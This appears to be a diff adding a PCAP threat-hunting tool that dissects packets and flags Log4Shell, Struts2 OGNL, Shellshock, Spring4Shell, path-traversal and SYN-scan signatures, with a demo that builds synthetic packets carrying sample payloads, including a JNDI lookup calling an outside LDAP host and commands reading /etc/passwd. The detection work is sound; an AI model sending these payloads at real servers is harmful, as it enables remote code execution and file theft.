@@ -1,0 +1,367 @@
+// tools/pcap_hunt.iris -- IRIS Offline PCAP Threat Hunter & Incident Forensics Tool
+//
+// Ingests raw libpcap captures, dissects Ethernet II, IPv4, and TCP protocol layers,
+// inspects application payloads, and maps cyberattacks to MITRE ATT&CK techniques.
+
+bring std.buffer
+bring std.pcap
+
+pub record ThreatIncident {
+    packet_num: i64,
+    timestamp: str,
+    src_ip: str,
+    src_port: i64,
+    dst_ip: str,
+    dst_port: i64,
+    technique_id: str,
+    technique_name: str,
+    cve_id: str,
+    severity: str,
+    matched_signature: str,
+    evidence: str,
+}
+
+pub record HuntReport {
+    total_packets: i64,
+    total_bytes: i64,
+    tcp_packets: i64,
+    incidents: list<ThreatIncident>,
+    threats_detected: i64,
+}
+
+/// Dissect a raw PCAP byte buffer and hunt for threat signatures
+pub def hunt_pcap_buffer(pcap_data: ByteBuffer) -> result<HuntReport, str> {
+    val hdr_res = pcap_parse_global_header(pcap_data);
+    match hdr_res {
+        err(e) => { return err(e); },
+        ok(hdr) => {},
+    };
+
+    var offset: i64 = 24; // Libpcap global header size
+    var packet_count: i64 = 0;
+    var total_wire_bytes: i64 = 0;
+    var tcp_count: i64 = 0;
+    val incidents: list<ThreatIncident> = list();
+
+    while (offset + 16) <= pcap_data.len {
+        val ts_sec = byte_buffer_read_u32_be(pcap_data, offset);
+        val ts_usec = byte_buffer_read_u32_be(pcap_data, offset + 4);
+        val incl_len = byte_buffer_read_u32_be(pcap_data, offset + 8);
+        val orig_len = byte_buffer_read_u32_be(pcap_data, offset + 12);
+
+        if offset + 16 + incl_len > pcap_data.len {
+            return err("packet record truncated at packet " + to_str(packet_count + 1));
+        }
+
+        val frame = byte_buffer_slice(pcap_data, offset + 16, offset + 16 + incl_len);
+        packet_count = packet_count + 1;
+        total_wire_bytes = total_wire_bytes + incl_len;
+
+        val ts_str = to_str(ts_sec) + "." + to_str(ts_usec);
+
+        // Dissect Ethernet
+        val eth_res = dissect_ethernet(frame);
+        match eth_res {
+            err(_) => {},
+            ok(eth) => {
+                if eth.ethertype == 0x0800 { // IPv4
+                    val ip_res = dissect_ipv4(eth.payload);
+                    match ip_res {
+                        err(_) => {},
+                        ok(ip) => {
+                            if ip.protocol == 6 { // TCP
+                                tcp_count = tcp_count + 1;
+                                val tcp_res = dissect_tcp(ip.payload);
+                                match tcp_res {
+                                    err(_) => {},
+                                    ok(tcp) => {
+                                        // 1. Check SYN Scan (Reconnaissance)
+                                        if tcp.syn && !tcp.ack_flag && tcp.payload.len == 0 {
+                                            val inc = ThreatIncident {
+                                                packet_num: packet_count,
+                                                timestamp: ts_str,
+                                                src_ip: ip.src_ip,
+                                                src_port: tcp.src_port,
+                                                dst_ip: ip.dst_ip,
+                                                dst_port: tcp.dst_port,
+                                                technique_id: "T1046",
+                                                technique_name: "Network Service Discovery",
+                                                cve_id: "N/A: Port Scan",
+                                                severity: "MEDIUM",
+                                                matched_signature: "TCP SYN Flag without ACK",
+                                                evidence: "Stealth SYN Probe to port " + to_str(tcp.dst_port),
+                                            };
+                                            list_push(incidents, inc);
+                                        }
+
+                                        // 2. Check Payload Signatures
+                                        if tcp.payload.len > 0 {
+                                            val payload_str = byte_buffer_to_ascii_lossy(tcp.payload);
+
+                                            // Log4Shell JNDI RCE
+                                            if contains(payload_str, "${jndi:") {
+                                                val inc = ThreatIncident {
+                                                    packet_num: packet_count,
+                                                    timestamp: ts_str,
+                                                    src_ip: ip.src_ip,
+                                                    src_port: tcp.src_port,
+                                                    dst_ip: ip.dst_ip,
+                                                    dst_port: tcp.dst_port,
+                                                    technique_id: "T1190",
+                                                    technique_name: "Exploit Public-Facing Application",
+                                                    cve_id: "CVE-2021-44228",
+                                                    severity: "CRITICAL",
+                                                    matched_signature: "${jndi: (Log4j LDAP/RMI RCE)",
+                                                    evidence: slice(payload_str, 0, if len(payload_str) > 60 { 60 } else { len(payload_str) }),
+                                                };
+                                                list_push(incidents, inc);
+                                            }
+
+                                            // Apache Struts2 OGNL RCE
+                                            if contains(payload_str, "#_memberAccess") || contains(payload_str, "ognl:") {
+                                                val inc = ThreatIncident {
+                                                    packet_num: packet_count,
+                                                    timestamp: ts_str,
+                                                    src_ip: ip.src_ip,
+                                                    src_port: tcp.src_port,
+                                                    dst_ip: ip.dst_ip,
+                                                    dst_port: tcp.dst_port,
+                                                    technique_id: "T1190",
+                                                    technique_name: "Exploit Public-Facing Application",
+                                                    cve_id: "CVE-2017-5638",
+                                                    severity: "CRITICAL",
+                                                    matched_signature: "OGNL Context Manipulation",
+                                                    evidence: slice(payload_str, 0, if len(payload_str) > 60 { 60 } else { len(payload_str) }),
+                                                };
+                                                list_push(incidents, inc);
+                                            }
+
+                                            // Shellshock Bash RCE
+                                            if contains(payload_str, "() { :; };") {
+                                                val inc = ThreatIncident {
+                                                    packet_num: packet_count,
+                                                    timestamp: ts_str,
+                                                    src_ip: ip.src_ip,
+                                                    src_port: tcp.src_port,
+                                                    dst_ip: ip.dst_ip,
+                                                    dst_port: tcp.dst_port,
+                                                    technique_id: "T1059",
+                                                    technique_name: "Command and Scripting Interpreter",
+                                                    cve_id: "CVE-2014-6271",
+                                                    severity: "CRITICAL",
+                                                    matched_signature: "() { :; }; (Bash Function Definition)",
+                                                    evidence: slice(payload_str, 0, if len(payload_str) > 60 { 60 } else { len(payload_str) }),
+                                                };
+                                                list_push(incidents, inc);
+                                            }
+
+                                            // Spring4Shell ClassLoader RCE
+                                            if contains(payload_str, "class.module.classLoader") {
+                                                val inc = ThreatIncident {
+                                                    packet_num: packet_count,
+                                                    timestamp: ts_str,
+                                                    src_ip: ip.src_ip,
+                                                    src_port: tcp.src_port,
+                                                    dst_ip: ip.dst_ip,
+                                                    dst_port: tcp.dst_port,
+                                                    technique_id: "T1190",
+                                                    technique_name: "Exploit Public-Facing Application",
+                                                    cve_id: "CVE-2022-22965",
+                                                    severity: "HIGH",
+                                                    matched_signature: "class.module.classLoader Property Binding",
+                                                    evidence: slice(payload_str, 0, if len(payload_str) > 60 { 60 } else { len(payload_str) }),
+                                                };
+                                                list_push(incidents, inc);
+                                            }
+
+                                            // Path Traversal
+                                            if contains(payload_str, "../../../..") {
+                                                val inc = ThreatIncident {
+                                                    packet_num: packet_count,
+                                                    timestamp: ts_str,
+                                                    src_ip: ip.src_ip,
+                                                    src_port: tcp.src_port,
+                                                    dst_ip: ip.dst_ip,
+                                                    dst_port: tcp.dst_port,
+                                                    technique_id: "T1083",
+                                                    technique_name: "File and Directory Discovery",
+                                                    cve_id: "CVE-2021-41773",
+                                                    severity: "HIGH",
+                                                    matched_signature: "../../../../ Directory Traversal Sequence",
+                                                    evidence: slice(payload_str, 0, if len(payload_str) > 60 { 60 } else { len(payload_str) }),
+                                                };
+                                                list_push(incidents, inc);
+                                            }
+                                        }
+                                    },
+                                };
+                            }
+                        },
+                    };
+                }
+            },
+        };
+
+        offset = offset + 16 + incl_len;
+    }
+
+    ok(HuntReport {
+        total_packets: packet_count,
+        total_bytes: total_wire_bytes,
+        tcp_packets: tcp_count,
+        incidents: incidents,
+        threats_detected: list_len(incidents),
+    })
+}
+
+/// Print formatted incident forensics audit report
+pub def print_hunt_report(report: HuntReport) -> i64 {
+    print("================================================================================");
+    print("               AEGIS-IRIS OFFLINE PCAP THREAT HUNTER REPORT                     ");
+    print("================================================================================");
+    print(" Total Packets Processed:    " + to_str(report.total_packets));
+    print(" Total Wire Data Bytes:      " + to_str(report.total_bytes));
+    print(" TCP Packets Dissected:      " + to_str(report.tcp_packets));
+    print(" Threats & CVEs Flagged:     " + to_str(report.threats_detected));
+    print("--------------------------------------------------------------------------------");
+    print(" INCIDENT FORENSIC AUDIT LOG:");
+    print("--------------------------------------------------------------------------------");
+
+    for i in 0 .. list_len(report.incidents) {
+        val inc = list_get(report.incidents, i);
+        print("[" + to_str(i + 1) + "] " + inc.severity + " -> " + inc.technique_id + ": " + inc.technique_name);
+        print("    * Timestamp:    " + inc.timestamp + " (Packet #" + to_str(inc.packet_num) + ")");
+        print("    * Flow:         " + inc.src_ip + ":" + to_str(inc.src_port) + " -> " + inc.dst_ip + ":" + to_str(inc.dst_port));
+        print("    * CVE / Impact: " + inc.cve_id);
+        print("    * Signature:    " + inc.matched_signature);
+        print("    * Evidence:     " + inc.evidence);
+    }
+
+    print("================================================================================");
+    0
+}
+
+def hunt_build_eth_ipv4_tcp_frame(
+    src_ip_b0: i64, src_ip_b1: i64, src_ip_b2: i64, src_ip_b3: i64,
+    dst_ip_b0: i64, dst_ip_b1: i64, dst_ip_b2: i64, dst_ip_b3: i64,
+    src_port: i64, dst_port: i64,
+    flags: i64,
+    payload_str: str,
+) -> ByteBuffer {
+    val payload_buf = byte_buffer_from_str(payload_str);
+
+    // 1. TCP header (20 bytes + payload)
+    var tcp = byte_buffer_new();
+    tcp = byte_buffer_write_u16_be(tcp, src_port);
+    tcp = byte_buffer_write_u16_be(tcp, dst_port);
+    tcp = byte_buffer_write_u32_be(tcp, 1000); // seq
+    tcp = byte_buffer_write_u32_be(tcp, 0);    // ack
+    tcp = byte_buffer_push(tcp, 0x50);        // data offset 5 (20 bytes)
+    tcp = byte_buffer_push(tcp, flags);       // flags
+    tcp = byte_buffer_write_u16_be(tcp, 64240); // window
+    tcp = byte_buffer_write_u16_be(tcp, 0);     // checksum
+    tcp = byte_buffer_write_u16_be(tcp, 0);     // urgent ptr
+    tcp = byte_buffer_concat(tcp, payload_buf);
+
+    // 2. IPv4 header (20 bytes + tcp)
+    val ip_total_len = 20 + tcp.len;
+    var ip = byte_buffer_new();
+    ip = byte_buffer_push(ip, 0x45); // version 4, IHL 5
+    ip = byte_buffer_push(ip, 0x00); // DSCP/ECN
+    ip = byte_buffer_write_u16_be(ip, ip_total_len);
+    ip = byte_buffer_write_u16_be(ip, 54321); // ID
+    ip = byte_buffer_write_u16_be(ip, 0x4000); // flags DF
+    ip = byte_buffer_push(ip, 64);            // TTL
+    ip = byte_buffer_push(ip, 6);             // Protocol: TCP (6)
+    ip = byte_buffer_write_u16_be(ip, 0);     // checksum
+    ip = byte_buffer_push(ip, src_ip_b0);
+    ip = byte_buffer_push(ip, src_ip_b1);
+    ip = byte_buffer_push(ip, src_ip_b2);
+    ip = byte_buffer_push(ip, src_ip_b3);
+    ip = byte_buffer_push(ip, dst_ip_b0);
+    ip = byte_buffer_push(ip, dst_ip_b1);
+    ip = byte_buffer_push(ip, dst_ip_b2);
+    ip = byte_buffer_push(ip, dst_ip_b3);
+    ip = byte_buffer_concat(ip, tcp);
+
+    // 3. Ethernet header (14 bytes + ip)
+    var eth = byte_buffer_new();
+    for i in 0 .. 6 { eth = byte_buffer_push(eth, 0xaa); };
+    for j in 0 .. 6 { eth = byte_buffer_push(eth, 0xbb); };
+    eth = byte_buffer_write_u16_be(eth, 0x0800); // ethertype IPv4
+    eth = byte_buffer_concat(eth, ip);
+    eth
+}
+
+pub def main() -> i64 {
+    print("================================================================================");
+    print("      AEGIS-IRIS OFFLINE PCAP THREAT HUNTER & ADVERSARIAL FORENSICS             ");
+    print("================================================================================");
+
+    // Synthesize demonstration PCAP trace with 6 enterprise capture packets
+    var pcap_buf = pcap_create_global_header(65535);
+
+    // 1. Benign Baseline Request
+    val p1 = hunt_build_eth_ipv4_tcp_frame(
+        10, 0, 1, 25, 10, 0, 1, 1,
+        50123, 80, 0x18,
+        "GET /api/v1/health HTTP/1.1\r\nHost: server.internal\r\n\r\n",
+    );
+    pcap_buf = byte_buffer_concat(pcap_buf, pcap_create_packet_record(p1, 1775600001, 100));
+
+    // 2. Reconnaissance SYN Port Sweep (T1046)
+    val p2 = hunt_build_eth_ipv4_tcp_frame(
+        203, 0, 113, 55, 10, 0, 1, 1,
+        41234, 8080, 0x02,
+        "",
+    );
+    pcap_buf = byte_buffer_concat(pcap_buf, pcap_create_packet_record(p2, 1775600002, 200));
+
+    // 3. Log4Shell JNDI RCE (CVE-2021-44228 / T1190)
+    val p3 = hunt_build_eth_ipv4_tcp_frame(
+        203, 0, 113, 19, 10, 0, 1, 1,
+        48921, 80, 0x18,
+        "GET /api/v1/search?q=${jndi:ldap://198.51.100.99:1389/Exploit} HTTP/1.1\r\nHost: server.internal\r\n\r\n",
+    );
+    pcap_buf = byte_buffer_concat(pcap_buf, pcap_create_packet_record(p3, 1775600003, 300));
+
+    // 4. Apache Struts2 OGNL RCE (CVE-2017-5638 / T1190)
+    val p4 = hunt_build_eth_ipv4_tcp_frame(
+        198, 51, 100, 77, 10, 0, 1, 1,
+        51234, 80, 0x18,
+        "POST /api/v1/upload HTTP/1.1\r\nContent-Type: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id')}\r\n\r\n",
+    );
+    pcap_buf = byte_buffer_concat(pcap_buf, pcap_create_packet_record(p4, 1775600004, 400));
+
+    // 5. GNU Bash Shellshock RCE (CVE-2014-6271 / T1059)
+    val p5 = hunt_build_eth_ipv4_tcp_frame(
+        198, 51, 100, 88, 10, 0, 1, 1,
+        52345, 80, 0x18,
+        "GET /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :; }; /bin/sh -c 'cat /etc/passwd'\r\n\r\n",
+    );
+    pcap_buf = byte_buffer_concat(pcap_buf, pcap_create_packet_record(p5, 1775600005, 500));
+
+    // 6. Apache Path Traversal (CVE-2021-41773 / T1083)
+    val p6 = hunt_build_eth_ipv4_tcp_frame(
+        198, 51, 100, 120, 10, 0, 1, 1,
+        53456, 80, 0x18,
+        "GET /api/v1/docs?file=../../../../etc/passwd HTTP/1.1\r\nHost: server.internal\r\n\r\n",
+    );
+    pcap_buf = byte_buffer_concat(pcap_buf, pcap_create_packet_record(p6, 1775600006, 600));
+
+    print("[PCAP INGEST] Loaded Libpcap Capture Buffer (" + to_str(pcap_buf.len) + " bytes)");
+
+    val hunt_res = hunt_pcap_buffer(pcap_buf);
+    match hunt_res {
+        ok(report) => {
+            print_hunt_report(report);
+            print("[FORENSIC SUMMARY] Ingested: " + to_str(report.total_packets) + " packets | Threat Incidents Flagged: " + to_str(report.threats_detected));
+        },
+        err(e) => {
+            print("[ERROR] hunt_pcap_buffer failed: " + e);
+        },
+    };
+
+    0
+}
+
